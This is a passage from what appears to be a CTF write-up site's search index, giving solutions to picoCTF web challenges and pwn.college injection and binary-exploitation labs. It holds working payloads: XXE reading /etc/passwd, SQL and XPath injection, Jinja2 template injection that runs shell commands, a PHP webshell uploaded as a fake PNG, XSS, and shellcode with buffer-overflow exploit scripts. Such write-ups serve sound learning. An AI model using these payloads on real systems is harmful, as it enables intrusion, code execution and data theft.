data.entries()) {\n        var key = pair[0];\n        var value = pair[1];\n\n        xml += '&lt;' + key + '&gt;' + value + '&lt;/' + key + '&gt;';\n    }\n\n    xml += '&lt;/data&gt;';\n    return xml;\n}\n</code></pre> <p>Where key is \"ID\" and value is 1, 2 or 3 depending on what card is clicked</p> <p>Searching about XML injection, I got to know about XML external entity (XXE) injection</p> <p>Original POST request (copy as Curl):</p> <pre><code>curl 'http://saturn.picoctf.net:60494/data' \\\n  -H 'Accept: */*' \\\n  -H 'Accept-Language: en-US,en;q=0.9,hi;q=0.8' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Content-Type: application/xml' \\\n  -H 'Origin: http://saturn.picoctf.net:60494' \\\n  -H 'Referer: http://saturn.picoctf.net:60494/' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \\\n  --data-raw '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;data&gt;&lt;ID&gt;1&lt;/ID&gt;&lt;/data&gt;' \\\n  --insecure\n</code></pre> <p>Modified request, using payload similar to the one in the blog:</p> <pre><code>curl 'http://saturn.picoctf.net:60494/data' \\\n  -H 'Accept: */*' \\\n  -H 'Accept-Language: en-US,en;q=0.9,hi;q=0.8' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Content-Type: application/xml' \\\n  -H 'Origin: http://saturn.picoctf.net:60494' \\\n  -H 'Referer: http://saturn.picoctf.net:60494/' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \\\n  --data-raw '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;&lt;data&gt;&lt;ID&gt;&amp;xxe;&lt;/ID&gt;&lt;/data&gt;' \\\n  --insecure\n</code></pre> <p>Response:</p> <pre><code>Invalid ID: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nflask:x:999:999::/app:/bin/sh\npicoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/SQL%20Direct/","title":"SQL Direct","text":"<p>After connecting to database, display tables:</p> <pre><code>\\dt\n</code></pre> <p>Display rows of the table:</p> <pre><code>SELECT * FROM &lt;table_name&gt;;\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/SQLiLite/","title":"SQLiLite","text":"<p>Submitting some username and password displays the query being executed:</p> <pre><code>SELECT * FROM users WHERE name='user' AND password='pass'\n</code></pre> <p>Enter the details so that the queriy would look like this:</p> <pre><code>SELECT * FROM users WHERE name='user' OR '1' = '1' AND password='pass' OR '1' = '1'\n</code></pre> <p>On success, inspect and view the HTML code.</p>"},{"location":"picoCTF/Web%20Exploitation/SSTI1/","title":"SSTI1","text":"<p>Server Side Template Injection</p> <p>Identify template engine by payload <code>{{7*'7'}}</code> \\ It's Jinja2</p> <p>Explore Jinja2 SSTI payloads</p> <p><code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code> -&gt; lists all subclasses, which has <code>&lt;class 'subprocess.Popen'&gt;</code> at index 356 \\ <code>{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls /', shell=True, stdout=-1).communicate() }}</code> -&gt; lists contents of root directory; <code>challenge</code> looks interesting \\ <code>{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls /challenge/', shell=True, stdout=-1).communicate() }}</code> -&gt; lists contents of directory of the web app; <code>flag</code> spotted! \\ <code>{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat /challenge/flag', shell=True, stdout=-1).communicate() }}</code> -&gt; done!</p>"},{"location":"picoCTF/Web%20Exploitation/SSTI2/","title":"SSTI 2","text":"<p>First, try this challenge</p> <p>VERY Helpful blog</p> <p>This payload works:</p> <pre><code>{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}\n</code></pre> <p>Simplifies to:</p> <pre><code>{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Scavenger%20Hunt/","title":"Scavenger Hunt","text":"<p>The flag is broken into 5 parts:</p> <ol> <li>Skim through <code>index.html</code>, 1st piece is in a comment. We also get to know about the CSS and JS files used</li> <li>2nd piece is in <code>mycss.css</code></li> <li> <p>A hint is given in <code>myjs.js</code>:</p> <p><code>js /* How can I keep Google from indexing my website? */</code></p> <p>This clearly refers to the robots.txt file. There lies the 3rd piece with another hint. 4. Hint:</p> <p>```text</p> </li> </ol>"},{"location":"picoCTF/Web%20Exploitation/Scavenger%20Hunt/#i-think-this-is-an-apache-server-can-you-access-the-next-flag","title":"I think this is an apache server... can you Access the next flag?","text":"<p>```</p> <p>After some researching, got to know about .htacess file. There's the 4th piece with another hint. 5. Hint:</p> <p>```text</p>"},{"location":"picoCTF/Web%20Exploitation/Scavenger%20Hunt/#i-love-making-websites-on-my-mac-i-can-store-a-lot-of-information-there","title":"I love making websites on my Mac, I can Store a lot of information there.","text":"<p>```</p> <p>This clearly indicates looking for .DS_Store. Voila! 5th piece acquired.</p>"},{"location":"picoCTF/Web%20Exploitation/Search%20source/","title":"Search source","text":"<p>Go through <code>style.css</code></p>"},{"location":"picoCTF/Web%20Exploitation/Secrets/","title":"Secrets","text":"<p>Inspect and open Sources Tab. The CSS and image are fetched from a folder <code>secret/assets/</code></p> <ol> <li>Go to <code>/secret/</code>. A subfolder appears.</li> <li>Go to <code>/secret/hidden/</code>. Another subfolder appears</li> <li>Go to <code>/secret/hidden/superhidden</code>. Now view the HTML code.</li> </ol>"},{"location":"picoCTF/Web%20Exploitation/Trickster/","title":"Trickster","text":"<p>If we check out <code>/robots.txt</code>, we find:</p> <pre><code>User-agent: *\nDisallow: /instructions.txt\nDisallow: /uploads/\n</code></pre> <p>On accessing <code>/instructions.txt</code>:</p> <pre><code>Let's create a web app for PNG Images processing.\nIt needs to:\nAllow users to upload PNG images\n    look for \".png\" extension in the submitted files\n    make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: \"50 4E 47\" )\nafter validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.\n</code></pre> <p>We can upload a PNG file and can access it at <code>/uploads/img.png</code>, but access to parent folder <code>/uploads/</code> is forbidden \\ On trying to upload some non-PNG file, we get \"Error: File name does not contain '.png'.\"</p> <p>\"contains\". Hmmm... Uploading a non-PNG file named as <code>file.png.txt</code> worked!</p> <p>Create a webshell:</p> <pre><code>PNG\n&lt;?php echo system($_GET['cmd']); ?&gt;\n</code></pre> <p><code>/uploads/webshell.png.php?cmd=ls%20..</code> lists out files in the root directory, among which \"GAZWIMLEGU2DQ.txt\" seems interesting</p> <p>Accessing <code>/GAZWIMLEGU2DQ.txt</code> gives the flag</p>"},{"location":"picoCTF/Web%20Exploitation/Unminify/","title":"Unminify","text":"<p>Just inspect and go though the source code</p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet%202/","title":"Web Gauntlet 2","text":"<p>Query executed:</p> <pre><code>SELECT username, password FROM users WHERE username='&lt;Username&gt;' AND password='&lt;Password&gt;'\n</code></pre> <p>Filter: <code>or</code> <code>and</code> <code>true</code> <code>false</code> <code>union</code> <code>like</code> <code>=</code> <code>&lt;</code> <code>&gt;</code> <code>--</code> <code>union</code> <code>admin</code></p> <p>SQLite Operators</p> <p>Username: <code>admi'||'n</code> \\ Password: <code>a' IS NOT 'q</code></p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet%203/","title":"Web Gauntlet 3","text":"<p>Prev soln works</p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/","title":"Web Gauntlet","text":"<p>Query executed:</p> <pre><code>SELECT * FROM users WHERE username='&lt;Username&gt;' AND password='&lt;Password&gt;'\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/#round-1","title":"Round 1","text":"<p>Filter: <code>or</code> \\ Submit username: <code>admin';--</code></p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/#round-2","title":"Round 2","text":"<p>Filter: <code>or</code> <code>and</code> <code>like</code> <code>=</code> <code>--</code>\\ Submit username: <code>admin'; SELECT * FROM users WHERE '1</code></p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/#round-3","title":"Round 3","text":"<p>Filter: <code>or</code> <code>and</code> <code>like</code> <code>=</code> <code>&lt;</code> <code>&gt;</code> <code>--</code>\\ The previous solution should work, but isn't. Checking response in Networks tab of filter.php shows us the actual one \\ Filter: <code>&lt;space&gt;</code> <code>or</code> <code>and</code> <code>like</code> <code>=</code> <code>&lt;</code> <code>&gt;</code> <code>--</code>\\ Submit username: <code>admin';'1</code></p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/#round-4","title":"Round 4","text":"<p>Filter: <code>&lt;space&gt;</code> <code>or</code> <code>and</code> <code>like</code> <code>=</code> <code>&lt;</code> <code>&gt;</code> <code>--</code> <code>admin</code>\\ Submit username: <code>admi'||'n';'1</code></p>"},{"location":"picoCTF/Web%20Exploitation/Web%20Gauntlet/#round-5","title":"Round 5","text":"<p>Filter: <code>&lt;space&gt;</code> <code>or</code> <code>and</code> <code>like</code> <code>=</code> <code>&lt;</code> <code>&gt;</code> <code>--</code> <code>union</code> <code>admin</code>\\ Previous one works</p>"},{"location":"picoCTF/Web%20Exploitation/WebDecode/","title":"WebDecode","text":"<ol> <li> <p>Go to the About page and Inspect:</p> <p><code>html &lt;section class=\"about\" notify_true=\"cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9\"&gt; &lt;h1&gt;     Try inspecting the page!! You might find it there &lt;/h1&gt; &lt;!-- .about-container --&gt; &lt;/section&gt;</code></p> </li> <li> <p>Decode the given string:</p> <p><code>shell echo \"cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9\" | base64 -d</code></p> </li> </ol>"},{"location":"picoCTF/Web%20Exploitation/Who%20are%20you/","title":"Who are you","text":"<p>HTTP Headers</p> <pre><code>Only people who use the official PicoBrowser are allowed on this site!\n</code></pre> <p>User-Agent header:</p> <pre><code>curl -A \"PicoBrowser\" http://mercury.picoctf.net:52362/\ncurl -H \"User-Agent: PicoBrowser\" http://mercury.picoctf.net:52362/\n</code></pre> <pre><code>I don't trust users visiting from another site.\n</code></pre> <p>Referer header:</p> <pre><code>curl -A \"PicoBrowser\" http://mercury.picoctf.net:52362/ -e http://mercury.picoctf.net:52362/\ncurl -H \"User-Agent: PicoBrowser\" -H \"Referer:http://mercury.picoctf.net:52362\" http://mercury.picoctf.net:52362/\n</code></pre> <pre><code>Sorry, this site only worked in 2018.\n</code></pre> <p>Date header:</p> <pre><code>curl -H \"User-Agent: PicoBrowser\" -H \"Referer:http://mercury.picoctf.net:52362\" -H \"Date: 2018\" http://mercury.picoctf.net:52362/\n</code></pre> <pre><code>I don't trust users who can be tracked.\n</code></pre> <p>DNT (Do Not Track) header:</p> <pre><code>curl -H \"User-Agent: PicoBrowser\" -H \"Referer:http://mercury.picoctf.net:52362\" -H \"Date: 2018\" -H \"DNT: 1\" http://mercury.picoctf.net:52362/\n</code></pre> <pre><code>This website is only for people from Sweden.\n</code></pre> <p>using random IP addr (example by Google) from Sweden X-Forwarded-For header:</p> <pre><code>curl -H \"User-Agent: PicoBrowser\" -H \"Referer:http://mercury.picoctf.net:52362\" -H \"Date: 2018\" -H \"DNT: 1\" -H \"X-Forwarded-For: 151.237.181.2\" http://mercury.picoctf.net:52362/\n</code></pre> <pre><code>You're in Sweden but you don't speak Swedish?\n</code></pre> <p>Accept-Language header:</p> <pre><code>curl -H \"User-Agent: PicoBrowser\" -H \"Referer:http://mercury.picoctf.net:52362\" -H \"Date: 2018\" -H \"DNT: 1\" -H \"X-Forwarded-For: 151.237.181.2\" -H \"Accept-Language:sv-SE\" http://mercury.picoctf.net:52362/\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/caas/","title":"caas","text":"<p>Do Command Injection</p> <p><code>/cowsay/flag;ls .</code> lists the contents -- there's a text file \"falg.txt\"</p> <p><code>/cowsay/flag;cat falg.txt</code></p>"},{"location":"picoCTF/Web%20Exploitation/dont-use-client-side/","title":"dont-use-client-side","text":"<p>Inspect and view the source code. Pieces of the flag are shown, assemble them.</p>"},{"location":"picoCTF/Web%20Exploitation/findme/","title":"findme","text":"<p>On entering user=test, pass=test:</p> <pre><code>try username:test and password:test!\n</code></pre> <p>Entering these creds, couple of redirects happen. Use BurpSuite to intercept these redirects. URLs of the two redirects have an <code>id</code> in the path. Concatenate the two ids and b64-decode the result.</p>"},{"location":"picoCTF/Web%20Exploitation/head-dump/","title":"head-dump","text":"<p><code>#API Documentation</code> directs to <code>/api-docs</code> \\ Notice a GET endpoint <code>/heapdump</code>. Sending a request downloads a heapsnapshot \\</p> <pre><code>cat heapdump-1741798688826.heapsnapshot | grep -i picoCTF{\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/login/","title":"login","text":"<p>Base64-encoded username and password are hardcoded in <code>index.js</code></p>"},{"location":"picoCTF/Web%20Exploitation/logon/","title":"logon","text":"<p>Can successfully login with any username other than \"Joe\" On login, cookies are set. Change value of \"admin\" cookie from False to True; reload.</p>"},{"location":"picoCTF/Web%20Exploitation/n0s4n1ty%201/","title":"n0s4n1ty 1","text":"<p>Similar to this challenge</p> <p>Upload a webshell.png.php:</p> <pre><code>PNG\n&lt;?php echo system($_GET['cmd']); ?&gt;\n</code></pre> <p>The webshell can be accessed at <code>/uploads/webshell.png.php</code></p> <p><code>?cmd=ls /root/</code> doesn't give anything \\ <code>?cmd=sudo ls /root/</code> lists the files in /root, which includes a flag.txt \\ <code>?cmd=sudo cat /root/flag.txt</code> prints the flag</p>"},{"location":"picoCTF/Web%20Exploitation/picobrowser/","title":"picobrowser","text":"<pre><code>You're not picobrowser! Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\n</code></pre> <pre><code>curl -H \"User-Agent:picobrowser\" https://jupiter.challenges.picoctf.org/problem/26704/flag\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/where%20are%20the%20robots/","title":"where are the robots","text":"<ol> <li>Go to <code>/robots.txt</code></li> <li>Go to the disallowed path</li> </ol>"},{"location":"pwn.college/Content%20Injection/CSV%20Injection/","title":"CSV Injection","text":""},{"location":"pwn.college/Content%20Injection/CSV%20Injection/#teacher-login","title":"Teacher Login","text":"<pre><code>The Login\nWelcome! Can you log in as teacher?\n\nThe User Database\n\nUSERNAME,IS_TEACHER\n\n\nAdd a User\nUsername:\n\nLogin\nUsername: \n</code></pre> <p>The input fields are of text type</p> <p>On adding a user, the database looks like:</p> <pre><code>USERNAME,IS_TEACHER\nuser,no\n</code></pre> <p>Injecting \"yes\" by adding a user of name \"user2,yes\"</p> <pre><code>USERNAME,IS_TEACHER\nuser2,yes,no\nuser,no\n</code></pre> <p>Log in by \"user2\" and we get the flag</p>"},{"location":"pwn.college/Content%20Injection/HTML%20Javascript%20Injection/","title":"HTML/Javascript Injection","text":""},{"location":"pwn.college/Content%20Injection/HTML%20Javascript%20Injection/#class-cancellation","title":"Class Cancellation","text":"<pre><code>The Chat\n\nLogin\nUsername: \n</code></pre> <p>After logging in..</p> <pre><code>The Chat\n\nPost as user\nMessage: \n</code></pre> <p>After posting...</p> <p></p> <p>The goal of the challenge is to create a message that looks like it was sent by the teacher, directly mimicing the structure of the other messages, that says Class Is Canceled!</p> <p>If we log in as \"teacher\", we get \"Posting as the teacher is strictly prohibited!\"</p> <p>We need to craft a post by user that injects HTML to mimic teacher's post. The HTML of the above image is:</p> <pre><code>&lt;hr&gt;\n&lt;b&gt;user:&lt;/b&gt;\nsomepost2\n&lt;hr&gt;\n&lt;b&gt;user:&lt;/b&gt;\nsomepost\n</code></pre> <p>Crafting the payload:</p> <pre><code>gimme flag &lt;hr&gt;&lt;b&gt;teacher:&lt;/b&gt; Class Is Canceled!\n</code></pre> <p></p> <p>Running the <code>victim</code> script now gives the flag</p>"},{"location":"pwn.college/Content%20Injection/HTML%20Javascript%20Injection/#class-cancellation-2","title":"Class Cancellation 2","text":"<p>This is similar to the previous challenge, but this time each <code>&lt;</code> in payload is converted into <code>(</code></p> <p>For posting a message, a GET request is made at <code>/post?message=&lt;message&gt;&amp;user=&lt;username&gt;</code></p> <p>Since message is sanitized, we can inject HTML in username:</p> <pre><code>user=&lt;/b&gt;gimme flag &lt;hr&gt;&lt;b&gt;teacher&amp;message=Class Is Canceled!\ncurl 'http://challenge.localhost/post?user=%3C%2Fb%3Egimme%20flag%20%3Chr%3E%3Cb%3Eteacher&amp;message=Class%20Is%20Canceled%21'\n</code></pre> <p></p>"},{"location":"pwn.college/Content%20Injection/HTML%20Javascript%20Injection/#class-cancellation-3","title":"Class Cancellation 3","text":"<p>In this challenge, we have to formulate some message that sends out the alert Class is Canceled!</p> <p>Post this payload:</p> <pre><code>&lt;img src=x onerror='alert(\"Class is Canceled!\")'&gt;\n</code></pre>"},{"location":"pwn.college/Content%20Injection/JSON%20Injection/","title":"JSON Injection","text":""},{"location":"pwn.college/Content%20Injection/JSON%20Injection/#teacher-login-5","title":"Teacher Login 5","text":"<pre><code>JSON Injection Login\n\nWelcome! Can you log in as teacher?\n\nCurrent Database (users.json)\n[]\n\nAdd a User\nUsername:\n\nLogin\nUsername: \n</code></pre> <p>The input fields are of text type</p> <p>After adding a couple of users, the db looks like:</p> <pre><code>[{\"username\": \"user2\", \"is_teacher\": \"no\"}, {\"username\": \"user\", \"is_teacher\": \"no\"}]\n</code></pre> <p>Injecting <code>\"is_teacher: \"yes\"</code> through the following payload</p> <pre><code>user3\", \"is_teacher\": \"yes\"}, {\"username\": \"user4\n</code></pre> <p>The result db:</p> <pre><code>[{\"username\": \"user3\", \"is_teacher\": \"yes\"}, {\"username\": \"user4\", \"is_teacher\": \"no\"}, {\"username\": \"user2\", \"is_teacher\": \"no\"}, {\"username\": \"user\", \"is_teacher\": \"no\"}]\n</code></pre> <p>Logging in by \"user3\" gives the flag</p>"},{"location":"pwn.college/Content%20Injection/XML%20Injection/","title":"XML Injection","text":""},{"location":"pwn.college/Content%20Injection/XML%20Injection/#teacher-login-6","title":"Teacher Login 6","text":"<pre><code>XML Injection Login\n\nWelcome! Can you log in as teacher?\n\nCurrent Database (users.xml)\n&lt;users&gt;&lt;/users&gt;\n\nAdd a User\nUsername:\n\nLogin\nUsername: \n</code></pre> <p>The input fields are of text type</p> <p>After adding a couple of users, the db looks like:</p> <pre><code>&lt;users&gt;&lt;user&gt;&lt;username&gt;user&lt;/username&gt;&lt;is_teacher&gt;no&lt;/is_teacher&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;user2&lt;/username&gt;&lt;is_teacher&gt;no&lt;/is_teacher&gt;&lt;/user&gt;&lt;/users&gt;\n</code></pre> <p>Injecting <code>&lt;is_teacher&gt;yes&lt;/is_teacher&gt;</code> using the payload:</p> <pre><code>user3&lt;/username&gt;&lt;is_teacher&gt;yes&lt;/is_teacher&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;user4\n</code></pre> <p>The result db:</p> <pre><code>&lt;users&gt;&lt;user&gt;&lt;username&gt;user&lt;/username&gt;&lt;is_teacher&gt;no&lt;/is_teacher&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;user2&lt;/username&gt;&lt;is_teacher&gt;no&lt;/is_teacher&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;user3&lt;/username&gt;&lt;is_teacher&gt;yes&lt;/is_teacher&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;user4&lt;/username&gt;&lt;is_teacher&gt;no&lt;/is_teacher&gt;&lt;/user&gt;&lt;/users&gt;\n</code></pre> <p>Logging in by \"user3\" gives the flag</p>"},{"location":"pwn.college/Content%20Injection/XML%20Injection/#teacher-login-7","title":"Teacher Login 7","text":"<p>The previous solution doesn't work as the input is being parsed; <code>&lt;</code> and <code>&gt;</code> are converted into <code>&amp;lt;</code> and <code>&amp;gt;</code></p> <p>In the sever code, we observe that XPath is being used to query:</p> <pre><code>query = f\"//user[username/text()='{username}' and is_teacher/text()='yes']\"\n</code></pre> <p>XPath Injection using the follwing username:</p> <pre><code>user' or 1=1 or 'a'='a\n</code></pre> <p>This results in the following xpath query:</p> <pre><code>//user[username/text()='user' or 1=1 or 'a'='a' and is_teacher/text()='yes']\nusername = 'user' or 1=1 or 'a'='a' and is_teacher='yes'\n(username = 'user' or 1=1) or ('a'='a' and is_teacher='yes')\n(false or true) or (true and false)\ntrue or false\ntrue\n</code></pre> <p>Logging in gives the flag</p>"},{"location":"pwn.college/Content%20Injection/YAML%20Injection/","title":"YAML Injection","text":""},{"location":"pwn.college/Content%20Injection/YAML%20Injection/#teacher-login-2","title":"Teacher Login 2","text":"<pre><code>YAML Injection Login\n\nWelcome! Can you log in as teacher?\n\nCurrent Database (users.yaml)\n\nAdd a User\nUsername:\n\nLogin\nUsername:\n</code></pre> <p>The input fields are of textarea type</p> <p>On adding a user, the database looks like:</p> <pre><code>- username: user\n  is_teacher: no\n</code></pre> <p>Injecting \"is_teacher: yes\" by adding a user of name:</p> <pre><code>user2\n  is_teacher: yes\n- username: user3\n</code></pre> <p>Now, the database looks like:</p> <pre><code>- username: user2\n  is_teacher: yes\n- username: user3\n  is_teacher: no\n- username: user\n  is_teacher: no\n</code></pre> <p>Logging in by \"user2\" gives the flag</p>"},{"location":"pwn.college/Content%20Injection/YAML%20Injection/#teacher-login-3","title":"Teacher Login 3","text":"<p>This is similar to the previous one, except the input fields are of text type, so we cannot send multi-line inputs</p> <p>On inspecting, we see that the request for adding a user is made at <code>/add?user=&lt;username&gt;</code></p> <p>URL-encode the previous payload and add the user: <code>/add?user=user2%0A%20%20is_teacher%3A%20yes%0A-%20username%3A%20user3</code></p> <p>Then proceed as before to get the flag</p>"},{"location":"pwn.college/Content%20Injection/YAML%20Injection/#teacher-login-4","title":"Teacher Login 4","text":"<p>This is similar to the previos one, except that in this one, POST request is used instead of GET</p> <p>We can use curl to make the POST request:</p> <pre><code>curl 'http://challenge.localhost/add' -X POST --data-raw $'user=user2\\n  is_teacher: yes\\n- username: user3'\n</code></pre> <p>The <code>$</code> is needed to pass newline in the payload</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Basic%20Shellcode/","title":"Basic Shellcode","text":"<pre><code>.global _start\n_start:\n.intel_syntax noprefix\n    mov rbx, 0x00000067616c662f # push \"/flag\" filename\n    push rbx\n    mov rax, 2                  # syscall number of open\n    mov rdi, rsp                # point the first argument at stack (where we have \"/flag\")\n    mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)\n    syscall                     # trigger open(\"/flag\", NULL)\n    mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)\n    mov rsi, rax                # second argument is the file descriptor returned by open\n    mov rdx, 0                  # third argument is the number of bytes to skip from the input file\n    mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file\n    mov rax, 40                 # syscall number of sendfile\n    syscall                     # trigger sendfile(1, fd, 0, 1000)\n    mov rax, 60                 # syscall number of exit\n    syscall                     # trigger exit()\n</code></pre> <pre><code>gcc -nostdlib -static shellcode.s -o shellcode-elf\nobjcopy --dump-section .text=shellcode-raw shellcode-elf\ncat shellcode-raw | /challenge/binary-exploitation-basic-shellcode\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Control%20Hijack/","title":"Control Hijack","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Control%20Hijack/#control-hijack-easy","title":"Control Hijack (easy)","text":"<p>As told in the debug output, the return address is stored 104 bytes from input buffer and has to be changed to 0x40229e</p> <pre><code>echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x9e\\x22\\x40\\x00\\x00\\x00\\x00\\x00\" | /challenge/binary-exploitation-control-hijack-w\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Control%20Hijack/#control-hijack-hard","title":"Control Hijack (hard)","text":"<ol> <li> <p>In gdb, <code>info functions</code> and <code>disas main</code>, we get to know:</p> <ul> <li>win() is at 0x00000000004013b4</li> <li>challenge() returns at 0x000000000040167b</li> </ul> </li> <li> <p>Set a breakpoint <code>b *challenge+242</code>, run and give a short string of a's as input</p> </li> <li><code>info frame</code> -&gt; rbp is at 0x7fffc56bb090</li> <li><code>x/100xg $rbp-200</code>:<ul> <li>input buffer starts at 0x7fffc56ba000, which is rbp-0x90 = rbp-144</li> <li>return address is stored at 0x7fffc56bb098, which is rbp+0x8 = rbp+8</li> </ul> </li> <li> <p>152 a's followed by desired address:</p> <p><code>shell echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xb4\\x13\\x40\\x00\\x00\\x00\\x00\\x00\" | /challenge/binary-exploitation-control-hijack</code></p> </li> </ol>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20%28Mapped%29%20Shellcode/","title":"Hijack to (Mapped) Shellcode","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20%28Mapped%29%20Shellcode/#hijack-to-mapped-shellcode-easy","title":"Hijack to (Mapped) Shellcode (easy)","text":"<ul> <li>Address to shellcode location is given in output</li> <li>GDB -&gt; <code>disas challenge</code> -&gt; <code>lea    rax,[rbp-0x80]</code> -&gt; offset should be 0x88</li> <li>But this gave one-byte off (indicated from helpful debug output); 0x89 worked:</li> </ul> <pre><code>from pwn import *\n\np = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode-w')\ncontext.arch = 'amd64'\n\nmapped_addr = 0x2edca000\nshellcode = asm(shellcraft.amd64.cat('/flag'))\np.sendline(shellcode)\n\noffset = 0x89\npayload = b'A'*offset\npayload += p64(mapped_addr)\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20%28Mapped%29%20Shellcode/#hijack-to-mapped-shellcode-hard","title":"Hijack to (Mapped) Shellcode (hard)","text":"<p>0x79 instead of 0x89 in prev solution</p>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20Shellcode/","title":"Hijack to Shellcode","text":""},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20Shellcode/#hijack-to-shellcode-easy","title":"Hijack to Shellcode (easy)","text":"<ul> <li>ASLR is disabled</li> <li>Buffer address and saved frame pointer (rbp) address given in output -&gt; get offset</li> </ul> <pre><code>from pwn import *\n\np = process('/challenge/binary-exploitation-hijack-to-shellcode-w')\ncontext.arch = 'amd64'\n\nshellcode = asm(shellcraft.amd64.cat('/flag'))\n\noffset = 0x38\nbuff_start = 0x7fffffffd670\npayload = b'\\x90'*offset\npayload += p64(buff_start+offset+0x8)\npayload += shellcode\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"pwn.college/Intro%20to%20Cybersecurity/Binary%20Exploitation/Hijack%20to%20Shellcode/#hijack-to-shellcode-hard","title":"Hijack to Shellcode (hard)","text":"<ul> <li>ASLR disabled</li> <li>GDB -&gt; set breakpoint after read and run -&gt; get ebp</li> </ul> <pre><code>from pwn import *\n\ncontext.arch = 'amd64'\np = process('/challenge/binary-exploitation-hijack-to-shellcode')\n\nshellcode = asm(shellcraft.amd64.cat('/flag'))\n# print(asm(shellcraft.amd64.cat('/flag')))\n\noffset = 